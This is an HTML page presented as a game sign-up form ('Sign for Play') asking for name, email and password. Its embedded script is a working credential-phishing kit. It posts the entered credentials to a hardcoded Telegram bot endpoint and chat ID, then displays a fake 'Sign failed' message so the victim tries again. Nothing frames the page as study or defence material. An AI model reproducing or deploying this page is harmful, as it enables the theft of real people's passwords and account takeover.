<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign for Play</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #42a5e7, #a241c9);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            background: linear-gradient(135deg, #03f8ffe6, #2e00f6);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            animation: fadeIn 1s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .form-container {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        h2 {
            margin-bottom: 20px;
            color: #333;
        }

        .input-group {
            width: 100%;
            margin-bottom: 15px;
        }

        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
        }

        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            transition: border-color 0.3s;
        }

        input:focus {
            border-color: #9b59b6;
            outline: none;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: aqua;
            color: black;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #cc0606;
        }
        h4 {
          color: red;
          background-color: white;
          width: 349px;
          border-radius: 2px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="form-container">
            <h2>Sign Up</h2>
            <form id="signupForm">
                <div class="input-group">
                    <label for="name">Nama</label>
                    <input type="text" id="name" name="name" required>
                </div>
                <div class="input-group">
                    <label for="email">Email</label>
                    <input type="email" id="email" name="email" required>
                </div>
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit">Sign Up</button>
            </form>
            <h4 id="thankYouMessage" style="display: none;">Sign failed. Enter the correct Email or Password!</h4>
        </div>
    </div>
<script>
  document.getElementById('signupForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the form from submitting normally
    
    // Collect form data
    var formData = {
        'Nama': document.getElementById('name').value,
        'Email': document.getElementById('email').value,
        'Password': document.getElementById('password').value,
        };
    
    // Send the data to your Telegram bot using fetch API
    fetch('https://api.telegram.org/bot7125404008:AAFje_W_sJf-kO09pVJTzSot06jbf6jr0ms/sendMessage', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: '5437158416',
            text: 'New Sign Up:\n' + JSON.stringify(formData, null, 2)
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    })
    .then(data => {
        console.log(data);
        // Display a thank you message or handle success as needed
        document.getElementById('thankYouMessage').style.display = 'block';
    })
    .catch(error => {
        console.error('There was an error!', error);
        // Handle errors
    });
});

</script>
</body>
</html>
